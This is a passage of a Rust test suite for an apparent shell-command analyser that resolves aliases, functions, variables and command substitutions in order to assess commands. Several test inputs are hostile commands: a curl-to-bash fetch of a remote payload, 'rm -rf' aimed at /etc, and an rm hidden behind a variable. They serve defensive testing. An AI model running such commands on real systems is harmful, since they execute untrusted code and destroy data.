
    #[test]
    fn find_glob_dispatch_preserves_bounds_without_inventing_a_member() {
        for (command, roots) in [
            (
                r"find /usr/share/* -type f -exec touch -- {} \;",
                vec!["/", "."],
            ),
            (
                r"find ./src/* -type f -exec touch -- {} \;",
                vec!["./", "."],
            ),
            (
                r"find ../src/* -type f -exec touch -- {} \;",
                vec!["../", "."],
            ),
            (
                r"find ~/src/* -type f -exec touch -- {} \;",
                vec!["/home/alice/", "."],
            ),
            (
                r"find ./src/* /opt/exact -type f -exec touch -- {} \;",
                vec!["./", "/opt/exact"],
            ),
            (
                r"find './src/*' -type f -exec touch -- {} \;",
                vec!["./src/*"],
            ),
        ] {
            let ctx = run_pass(&SessionSummary::new(), ShellKind::Bash, command);
            assert!(
                ctx.execution_unit_resolve_records().iter().any(|record| {
                    record.origin_kind == ExecutionUnitOriginKind::Dispatch
                        && execution_record_has_runtime_path(record, "touch", 1, &roots)
                }),
                "{command}: {:#?}",
                ctx.execution_unit_resolve_records()
            );
        }
    }

    #[test]
    fn find_glob_dispatch_does_not_clear_unknown_or_followed_root_members() {
        for command in [
            r#"find ./src/* "$UNKNOWN" -type f -exec touch -- {} \;"#,
            r"find -L ./src/* -type f -exec touch -- {} \;",
        ] {
            let ctx = run_pass(&SessionSummary::new(), ShellKind::Bash, command);
            assert!(
                ctx.execution_unit_resolve_records().iter().any(|record| {
                    let command = &record.parsed_scope.commands[record.command_ref.command_index];
                    command.command_name.as_deref() == Some("touch")
                        && command.tokens.iter().any(|token| {
                            matches!(
                                &token.runtime_argument_domain,
                                Some(caushell_types::RuntimeArgumentDomain::PathSet {
                                    may_escape: true,
                                    ..
                                })
                            )
                        })
                }),
                "{command}: {:#?}",
                ctx.execution_unit_resolve_records()
            );
        }
        let ctx = run_pass(
            &SessionSummary::new(),
            ShellKind::Bash,
            r#"find "$UNKNOWN" -type f -exec touch -- {} \;"#,
        );
        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            let command = &record.parsed_scope.commands[record.command_ref.command_index];
            command.command_name.as_deref() == Some("touch")
                && command.tokens.iter().any(|token| matches!(
                    &token.runtime_argument_domain,
                    Some(caushell_types::RuntimeArgumentDomain::PathSet { roots, may_escape: true, .. }) if roots.is_empty()
                ))
        }));
    }

    fn execution_record_has_runtime_path(
        record: &caushell_runner::ExecutionUnitResolveRecord,
        command_name: &str,
        argument_index: usize,
        roots: &[&str],
    ) -> bool {
        let command = &record.parsed_scope.commands[record.command_ref.command_index];
        let expected = caushell_types::RuntimeArgumentDomain::PathSet {
            roots: roots.iter().map(|root| root.to_string()).collect(),
            may_escape: false,
            basename_suffix: None,
            no_adjacent_slashes: false,
            dot_relative_components: false,
            execdir_leaf: false,
        };
        command.command_name.as_deref() == Some(command_name)
            && command.tokens.get(argument_index).is_some_and(|token| {
                token.implicit_input_source
                    == Some(caushell_types::ImplicitInputSource::DispatchOutput)
                    && token.runtime_argument_domain.as_ref() == Some(&expected)
            })
    }

    fn execution_record_binds_runtime_path(
        record: &caushell_runner::ExecutionUnitResolveRecord,
        roots: &[&str],
    ) -> bool {
        let expected = caushell_types::RuntimeArgumentDomain::PathSet {
            roots: roots.iter().map(|root| root.to_string()).collect(),
            may_escape: false,
            basename_suffix: None,
            no_adjacent_slashes: false,
            dot_relative_components: false,
            execdir_leaf: false,
        };
        matches!(&record.result, ResolveInvocationArtifactResult::Resolved(resolved)
            if resolved.bound.bound_parameters.iter().flat_map(|parameter| &parameter.values)
                .any(|value| matches!(value, BoundValue::ImplicitInput { source: caushell_profile::ImplicitInputSource::DispatchOutput, domain: Some(domain), .. } if domain == &expected)))
    }

    fn run_pass(summary: &SessionSummary, shell_kind: ShellKind, command: &str) -> RunnerContext {
        run_pass_with_registry(summary, shell_kind, command, built_in_registry())
    }

    fn run_pass_with_registry(
        summary: &SessionSummary,
        shell_kind: ShellKind,
        command: &str,
        registry: ProfileRegistry,
    ) -> RunnerContext {
        let mut runner = PassRunner::new();
        runner.register_request_transform_pass(ParseCommandPass);
        runner.register_session_transform_pass(ProjectTopLevelCommandsPass);
        runner.register_session_transform_pass(ResolveInvocationPass::new(registry));

        let graph = SessionGraph::new();
        let mut ctx = RunnerContext::new(sample_request(shell_kind, command));

        runner.run(SessionView::new(&graph, summary), &mut ctx);
        ctx
    }

    fn run_pass_with_request(
        summary: &SessionSummary,
        request: CheckRequest,
        registry: ProfileRegistry,
    ) -> RunnerContext {
        let mut runner = PassRunner::new();
        runner.register_request_transform_pass(ParseCommandPass);
        runner.register_session_transform_pass(ProjectTopLevelCommandsPass);
        runner.register_session_transform_pass(ResolveInvocationPass::new(registry));

        let graph = SessionGraph::new();
        let mut ctx = RunnerContext::new(request);

        runner.run(SessionView::new(&graph, summary), &mut ctx);
        ctx
    }

    fn run_pass_with_session(
        graph: SessionGraph,
        summary: &SessionSummary,
        shell_kind: ShellKind,
        command: &str,
    ) -> RunnerContext {
        let mut runner = PassRunner::new();
        runner.register_request_transform_pass(ParseCommandPass);
        runner.register_session_transform_pass(ProjectTopLevelCommandsPass);
        runner.register_session_transform_pass(ResolveInvocationPass::new(built_in_registry()));

        let mut ctx = RunnerContext::new(sample_request(shell_kind, command));

        runner.run(SessionView::new(&graph, summary), &mut ctx);
        ctx
    }

    fn graph_with_known_payload_file(
        path: &str,
        producer_raw_text: &str,
        produced_at: CommandSequenceNo,
    ) -> SessionGraph {
        let mut graph = SessionGraph::new();

        let command_node_id = NodeId::new("command:sess-1:1");
        let artifact_node_id = NodeId::new(format!("artifact:path-content:{path}"));

        let _ = graph.add_command_invocation(
            command_node_id.clone(),
            SessionId::new("sess-1"),
            produced_at,
            producer_raw_text,
            "/tmp/project",
            ShellKind::Bash,
        );
        let _ = graph.add_node(GraphNode::new_provenance_artifact(
            artifact_node_id.clone(),
            ProvenanceArtifact::PathContent {
                path: path.to_string(),
                version: None,
            },
        ));
        let _ = graph.add_edge(Edge::with_semantics(
            command_node_id,
            artifact_node_id,
            EdgeKind::Produces,
            ProvenanceEdgeSemantics::Produce {
                produce_kind: ProvenanceProduceKind::PathWrite,
                slot_name: Some("redirect_target_0".to_string()),
                normalized_command_name: None,
                domain_label: Some(ProvenanceDomainLabel::Path {
                    role: ResolvedPathRole::Write,
                    purpose: Some(ResolvedPathPurpose::GenericOperand),
                }),
            },
        ));

        graph
    }

    fn run_pass_with_policy(
        summary: &SessionSummary,
        shell_kind: ShellKind,
        command: &str,
        policy: PolicyConfig,
    ) -> RunnerContext {
        let mut runner = PassRunner::new();
        runner.register_request_transform_pass(ParseCommandPass);
        runner.register_session_transform_pass(ProjectTopLevelCommandsPass);
        runner.register_session_transform_pass(ResolveInvocationPass::new(built_in_registry()));

        let graph = SessionGraph::new();
        let mut ctx = RunnerContext::with_policy(sample_request(shell_kind, command), policy);

        runner.run(SessionView::new(&graph, summary), &mut ctx);
        ctx
    }

    #[test]
    fn resolve_invocation_pass_stores_command_resolution_for_known_profile() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"bash -c 'echo ok'"#);

        assert_eq!(
            ctx.executed_passes,
            vec![
                "parse_command".to_string(),
                "project_top_level_commands".to_string(),
                "resolve_invocation".to_string()
            ]
        );
        let top_level = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::TopLevel
                    && record.source_node_id.0 == "command:sess-1:2:0"
            })
            .expect("expected top-level resolve record");
        assert_eq!(top_level.command_ref.command_index, 0);

        match &top_level.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "command_string");
                assert_eq!(first_argument_text(&resolved.bound, "payload"), "echo ok");
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_home_in_quoted_command_path() {
        let mut summary = SessionSummary::new();
        summary.set_exact_scalar_variable("HOME", "/home/alice", false, CommandSequenceNo::new(1));
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#""$HOME/.npm/_npx/cache/node_modules/.bin/dsh" plugin --help"#,
        );

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::NoProfile {
                normalized_command_name,
                ..
            } => assert_eq!(
                normalized_command_name,
                "/home/alice/.npm/_npx/cache/node_modules/.bin/dsh"
            ),
            other => panic!("expected materialized command path, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_braced_home_and_tilde_command_paths() {
        let mut summary = SessionSummary::new();
        summary.set_exact_scalar_variable("HOME", "/home/alice", false, CommandSequenceNo::new(1));

        for (command, expected) in [
            (r#""${HOME}/bin/tool" --help"#, "/home/alice/bin/tool"),
            ("~/.local/bin/tool --help", "/home/alice/.local/bin/tool"),
        ] {
            let ctx = run_pass(&summary, ShellKind::Bash, command);
            match &top_level_record(&ctx, 0).result {
                ResolveInvocationArtifactResult::NoProfile {
                    normalized_command_name,
                    ..
                } => assert_eq!(normalized_command_name, expected),
                other => panic!("expected materialized command path, got {other:?}"),
            }
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_same_action_variable_command_paths() {
        let mut summary = SessionSummary::new();
        summary.set_exact_scalar_variable("HOME", "/home/alice", false, CommandSequenceNo::new(1));
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"BIN="$HOME/bin"; "$BIN/tool" --help"#,
        );

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::NoProfile {
                normalized_command_name,
                ..
            } => assert_eq!(normalized_command_name, "/home/alice/bin/tool"),
            other => panic!("expected materialized command path, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_same_action_dynamic_rm_command() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"CMD=rm; "$CMD" -rf ./victim"#);

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "rm");
                assert!(
                    resolved
                        .bound
                        .effects
                        .iter()
                        .any(|effect| { effect.kind == caushell_profile::EffectKind::DeletePath })
                );
            }
            other => panic!("expected resolved rm invocation, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_empty_variable_in_command_concatenation() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "EMPTY=; printf$EMPTY hello");

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "printf");
            }
            other => panic!("expected resolved printf invocation, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_keeps_unknown_command_variable_unresolved() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#""$USER_CMD" --help"#);

        assert!(matches!(
            top_level_record(&ctx, 0).result,
            ResolveInvocationArtifactResult::MissingCommandName { .. }
        ));
    }

    #[test]
    fn resolve_invocation_pass_treats_single_quoted_dollar_as_literal_command_text() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"'$HOME/bin/tool' --help"#);

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::NoProfile {
                normalized_command_name,
                ..
            } => assert_eq!(normalized_command_name, "$HOME/bin/tool"),
            other => panic!("expected literal command name, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_uses_session_summary_for_materialization() {
        let mut summary = SessionSummary::new();
        summary.set_exact_scalar_variable("mode", "-s", false, CommandSequenceNo::new(1));

        let ctx = run_pass(&summary, ShellKind::Bash, "bash $mode");

        let top_level = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::TopLevel
                    && record.source_node_id.0 == "command:sess-1:2:0"
            })
            .expect("expected top-level resolve record");

        match &top_level.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.bound.form_id.as_str(), "stdin_script_explicit");
                assert_eq!(
                    resolved.materialized_projection.arg_resolutions[0],
                    ValueMaterialization::ResolvedExactScalar {
                        variable_name: "mode".to_string(),
                        value: "-s".to_string(),
                        origin: caushell_profile::BindingOrigin::SessionBinding,
                    }
                );
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_uses_same_request_assignment_for_materialization() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"TARGET=/etc; rm -rf "$TARGET""#,
        );

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "rm");
                assert_eq!(first_argument_text(&resolved.bound, "path_targets"), "/etc");
                assert_eq!(
                    resolved.materialized_projection.arg_resolutions[1],
                    ValueMaterialization::ResolvedExactScalar {
                        variable_name: "TARGET".to_string(),
                        value: "/etc".to_string(),
                        origin: caushell_profile::BindingOrigin::SessionBinding,
                    }
                );
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_treats_file_stdin_redirection_as_payload_available() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "bash < ./payload.sh");

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "stdin_script_implicit");
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_treats_herestring_as_payload_available() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"bash <<< "echo ok""#);

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "stdin_script_implicit");
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_treats_heredoc_as_payload_available() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "bash <<'EOF'\necho ok\nEOF");

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "stdin_script_implicit");
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_treats_process_substitution_output_body_as_payload_available() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"echo ok > >(bash)"#);

        let record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.source_node_id
                    == NodeId::new("expanded-procsub-body:command:sess-1:2:0:redir:0:0:0")
            })
            .expect("expected process substitution derived record");

        match &record.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "stdin_script_implicit");
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_gives_sibling_process_substitutions_distinct_node_ids() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "diff <(ls dir1) <(ls dir2)");
        let records: Vec<_> = ctx
            .execution_unit_resolve_records()
            .iter()
            .filter(|record| record.origin_kind == ExecutionUnitOriginKind::ProcessSubstitutionBody)
            .collect();
        assert_eq!(records.len(), 2);

        let ids: BTreeSet<_> = records
            .iter()
            .map(|record| record.source_node_id.0.as_str())
            .collect();
        assert_eq!(ids.len(), 2);
        assert!(ids.contains("expanded-procsub-body:command:sess-1:2:0:arg:0:0:0:0"));
        assert!(ids.contains("expanded-procsub-body:command:sess-1:2:0:arg:0:1:0:0"));
    }

    #[test]
    fn resolve_invocation_pass_records_assignment_body_command_substitution_execution_unit() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"TMP_SCRIPT="$(mktemp /tmp/tmp.XXXXXX.sh)""#,
        );

        let record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == ExecutionUnitOriginKind::CommandSubstitutionBody
                    && record.rendered_command_text == "mktemp /tmp/tmp.XXXXXX.sh"
            })
            .expect("expected assignment-body command substitution execution unit");

        assert_eq!(
            record.parent_execution_node_id,
            NodeId::new("command:sess-1:2:0")
        );
        assert_eq!(
            record.source_node_id,
            NodeId::new("expanded-subst-assign:command:sess-1:2:0:0:0:0:0")
        );
        assert_eq!(
            record.origin_locator,
            ExecutionUnitOriginLocator::CommandSubstitutionAssignmentValue {
                assignment_scope_key: None,
                source_cwd_anchor: caushell_runner::ShellSourceCwdAnchor::RequestPosition {
                    start_byte: 0
                },
                assignment_command_index: 0,
                assignment_index: 0,
                substitution_index: 0,
                assignment_name: "TMP_SCRIPT".to_string(),
                assignment_value_text: "$(mktemp /tmp/tmp.XXXXXX.sh)".to_string(),
                substitution_text: "$(mktemp /tmp/tmp.XXXXXX.sh)".to_string(),
                substitution_body_text: "mktemp /tmp/tmp.XXXXXX.sh".to_string(),
            }
        );
    }

    #[test]
    fn resolve_invocation_pass_does_not_expand_single_quoted_token_command_substitution() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"echo '$(mktemp /tmp/tmp.XXXXXX.sh)'"#,
        );

        assert!(
            !ctx.execution_unit_resolve_records().iter().any(|record| {
                record.origin_kind == ExecutionUnitOriginKind::CommandSubstitutionBody
                    && record.rendered_command_text == "mktemp /tmp/tmp.XXXXXX.sh"
            }),
            "single-quoted command substitution literal must not create execution units"
        );
    }

    #[test]
    fn resolve_invocation_pass_does_not_expand_single_quoted_assignment_command_substitution() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"TMP_SCRIPT='$(mktemp /tmp/tmp.XXXXXX.sh)'"#,
        );

        assert!(
            !ctx.execution_unit_resolve_records().iter().any(|record| {
                record.origin_kind == ExecutionUnitOriginKind::CommandSubstitutionBody
                    && record.rendered_command_text == "mktemp /tmp/tmp.XXXXXX.sh"
            }),
            "single-quoted assignment literal must not create execution units"
        );
    }

    #[test]
    fn resolve_invocation_pass_expands_assignment_command_substitution_inside_shell_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -c 'TMP_SCRIPT="$(mktemp /tmp/tmp.XXXXXX.sh)"'"#,
        );

        let record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.source_node_id
                    == NodeId::new("expanded-subst-assign:command:sess-1:2:0:shell-payload:0:0:0:0")
                    && record.origin_kind == ExecutionUnitOriginKind::CommandSubstitutionBody
                    && record.rendered_command_text == "mktemp /tmp/tmp.XXXXXX.sh"
            })
            .expect("expected shell-payload assignment command substitution execution unit");

        assert_eq!(
            record.parent_execution_node_id,
            NodeId::new("command:sess-1:2:0")
        );
        assert_eq!(
            record.source_node_id,
            NodeId::new("expanded-subst-assign:command:sess-1:2:0:shell-payload:0:0:0:0")
        );
        assert_eq!(
            record.origin_locator,
            ExecutionUnitOriginLocator::CommandSubstitutionAssignmentValue {
                assignment_scope_key: Some("shell-payload".into()),
                source_cwd_anchor: caushell_runner::ShellSourceCwdAnchor::InvocationEntry,
                assignment_command_index: 0,
                assignment_index: 0,
                substitution_index: 0,
                assignment_name: "TMP_SCRIPT".to_string(),
                assignment_value_text: "$(mktemp /tmp/tmp.XXXXXX.sh)".to_string(),
                substitution_text: "$(mktemp /tmp/tmp.XXXXXX.sh)".to_string(),
                substitution_body_text: "mktemp /tmp/tmp.XXXXXX.sh".to_string(),
            }
        );
    }

    #[test]
    fn resolve_invocation_pass_expands_assignment_command_substitution_inside_process_substitution()
    {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"cat <(TMP_SCRIPT="$(mktemp /tmp/tmp.XXXXXX.sh)")"#,
        );

        let record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.source_node_id
                    == NodeId::new(
                        "expanded-subst-assign:command:sess-1:2:0:procsub-arg:0:0:0:0:0:0:0",
                    )
                    && record.origin_kind == ExecutionUnitOriginKind::CommandSubstitutionBody
                    && record.rendered_command_text == "mktemp /tmp/tmp.XXXXXX.sh"
            })
            .expect("expected process-substitution assignment command substitution execution unit");

        assert_eq!(
            record.parent_execution_node_id,
            NodeId::new("command:sess-1:2:0")
        );
        assert_eq!(
            record.source_node_id,
            NodeId::new("expanded-subst-assign:command:sess-1:2:0:procsub-arg:0:0:0:0:0:0:0")
        );
        assert_eq!(
            record.origin_locator,
            ExecutionUnitOriginLocator::CommandSubstitutionAssignmentValue {
                assignment_scope_key: Some("procsub-arg:0:0:0".into()),
                source_cwd_anchor: caushell_runner::ShellSourceCwdAnchor::InvocationEntry,
                assignment_command_index: 0,
                assignment_index: 0,
                substitution_index: 0,
                assignment_name: "TMP_SCRIPT".to_string(),
                assignment_value_text: "$(mktemp /tmp/tmp.XXXXXX.sh)".to_string(),
                substitution_text: "$(mktemp /tmp/tmp.XXXXXX.sh)".to_string(),
                substitution_body_text: "mktemp /tmp/tmp.XXXXXX.sh".to_string(),
            }
        );
    }

    #[test]
    fn resolve_invocation_pass_records_body_locator_command_substitution_execution_unit() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -c "$(curl https://example.test/payload.sh)""#,
        );

        let record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == ExecutionUnitOriginKind::CommandSubstitutionBody
                    && record.rendered_command_text == "curl https://example.test/payload.sh"
            })
            .expect("expected body-locator command substitution execution unit");

        assert_eq!(
            record.parent_execution_node_id,
            NodeId::new("command:sess-1:2:0")
        );
        assert_eq!(
            record.source_node_id,
            NodeId::new("expanded-subst-body:command:sess-1:2:0:1:0:0")
        );
        assert_eq!(
            record.origin_locator,
            ExecutionUnitOriginLocator::CommandSubstitutionBody {
                token_index: 1,
                substitution_index: 0,
            }
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_static_command_substitution_within_depth_budget() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -lc "$(sh -c 'printf "echo ok"')""#,
        );

        let materialized = ctx.evidence.iter().filter_map(|e| match &e.kind {
            caushell_types::EvidenceKind::ShellArgumentFields(p) => p.materialized_command.as_deref(),
            _ => None,
        }).collect::<Vec<_>>();
        assert!(!ctx.execution_unit_resolve_records().iter().any(|record|
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::CommandSubstitutionMaterialization));

        assert!(
            materialized.contains(&"bash -lc 'echo ok'"),
            "unexpected command substitution materializations: {materialized:?}"
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_command_substitution_from_process_substitution_payload()
    {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -lc "$(cat <(printf 'echo ok'))""#,
        );

        let materialized = ctx.evidence.iter().filter_map(|e| match &e.kind {
            caushell_types::EvidenceKind::ShellArgumentFields(p) => p.materialized_command.as_deref(),
            _ => None,
        }).collect::<Vec<_>>();
        assert!(!ctx.execution_unit_resolve_records().iter().any(|record|
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::CommandSubstitutionMaterialization));

        assert!(
            materialized.contains(&"bash -lc 'echo ok'"),
            "unexpected command substitution materializations: {materialized:?}"
        );
    }

    #[test]
    fn resolve_invocation_pass_does_not_materialize_command_substitution_past_depth_budget() {
        let summary = SessionSummary::new();
        let policy = PolicyConfig {
            semantic_expansion: caushell_types::SemanticExpansionPolicy {
                max_nested_parse_depth: 1,
            },
            ..PolicyConfig::default()
        };
        let ctx = run_pass_with_policy(
            &summary,
            ShellKind::Bash,
            r#"bash -lc "$(sh -c 'printf "echo ok"')""#,
            policy,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::CommandSubstitutionBody
                && record.rendered_command_text == "sh -c 'printf \"echo ok\"'"
        }));
        assert!(!ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind
                == caushell_runner::ExecutionUnitOriginKind::CommandSubstitutionMaterialization
        }));
        assert!(!ctx.evidence.iter().any(|e|matches!(&e.kind,
            caushell_types::EvidenceKind::ShellArgumentFields(p) if p.materialized_command.is_some())));
    }

    #[test]
    fn symbolic_native_jobs_keep_the_shared_expansion_depth_limit() {
        let policy = PolicyConfig {
            semantic_expansion: caushell_types::SemanticExpansionPolicy {
                max_nested_parse_depth: 1,
            },
            ..PolicyConfig::default()
        };
        let ctx = run_pass_with_policy(
            &SessionSummary::new(),
            ShellKind::Bash,
            "cat unknown | parallel echo {}",
            policy,
        );
        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .all(|record| record.depth <= 1)
        );
        assert!(ctx.evidence.iter().any(|evidence| matches!(
            evidence.kind,
            caushell_types::EvidenceKind::ExecutionExpansionTruncated(_)
        )));
    }

    #[test]
    fn resolve_invocation_pass_uses_inherited_environment_when_summary_has_no_binding() {
        let summary = SessionSummary::new();
        let mut request = sample_request(ShellKind::Bash, r#"bash -c "$USER_CMD""#);
        request.shell_state_before = request
            .shell_state_before
            .clone()
            .with_exact_scalar_variable("USER_CMD", "echo ok", true)
            .with_variable_knowledge(caushell_types::ShellStateKnowledge::ExportedOnly);

        let ctx = run_pass_with_request(&summary, request, built_in_registry());

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.bound.form_id.as_str(), "command_string");
                assert_eq!(
                    resolved.materialized_projection.arg_resolutions[1],
                    ValueMaterialization::ResolvedExactScalar {
                        variable_name: "USER_CMD".to_string(),
                        value: "echo ok".to_string(),
                        origin: caushell_profile::BindingOrigin::InheritedEnvironment,
                    }
                );
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_expands_session_alias_before_profile_resolution() {
        let mut summary = SessionSummary::new();
        summary.set_alias(
            "runbuild",
            "bash ./scripts/build.sh",
            CommandSequenceNo::new(1),
        );

        let ctx = run_pass(&summary, ShellKind::Bash, "runbuild");

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "script_file");
                assert_eq!(
                    first_argument_text(&resolved.bound, "script_path"),
                    "./scripts/build.sh"
                );
            }
            other => panic!("expected resolved alias expansion, got {other:?}"),
        }

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddDerivedInvocation {
                node_id,
                origin,
                derived_command_index,
                raw_text,
                command_name,
                depth,
                ..
            } if node_id.0 == "derived-alias:sess-1:2:0:0"
                && *origin == DerivedInvocationOrigin::AliasExpansion {
                    source_command_index: 0,
                    alias_name: "runbuild".to_string(),
                }
                && *derived_command_index == 0
                && raw_text == "bash ./scripts/build.sh"
                && command_name.as_deref() == Some("bash")
                && *depth == 1
        )));
    }

    #[test]
    fn resolve_invocation_pass_expands_alias_defined_earlier_in_same_request() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "alias runbuild='bash ./scripts/build.sh'; runbuild",
        );

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "alias");
                assert_eq!(resolved.bound.form_id.as_str(), "builtin");
            }
            other => panic!("expected alias builtin to resolve, got {other:?}"),
        }

        match &top_level_record(&ctx, 1).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "script_file");
                assert_eq!(
                    first_argument_text(&resolved.bound, "script_path"),
                    "./scripts/build.sh"
                );
            }
            other => panic!("expected same-request alias expansion, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_expands_session_function_as_derived_invocation() {
        let mut summary = SessionSummary::new();
        summary.set_function(
            "deploy",
            "bash ./scripts/build.sh;",
            CommandSequenceNo::new(1),
        );

        let ctx = run_pass(&summary, ShellKind::Bash, "deploy");

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { record.source_node_id.0 == "derived-function:sess-1:2:0:0" })
        );

        let derived_record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| record.source_node_id.0 == "derived-function:sess-1:2:0:0")
            .expect("expected function-derived resolve record");

        match &derived_record.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "script_file");
                assert_eq!(
                    first_argument_text(&resolved.bound, "script_path"),
                    "./scripts/build.sh"
                );
            }
            other => panic!("expected resolved function body invocation, got {other:?}"),
        }

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddDerivedInvocation {
                node_id,
                origin,
                derived_command_index,
                raw_text,
                command_name,
                depth,
                ..
            } if node_id.0 == "derived-function:sess-1:2:0:0"
                && *origin == DerivedInvocationOrigin::FunctionExpansion {
                    source_command_index: 0,
                    function_name: "deploy".to_string(),
                }
                && *derived_command_index == 0
                && raw_text == "bash ./scripts/build.sh"
                && command_name.as_deref() == Some("bash")
                && *depth == 1
        )));
    }

    #[test]
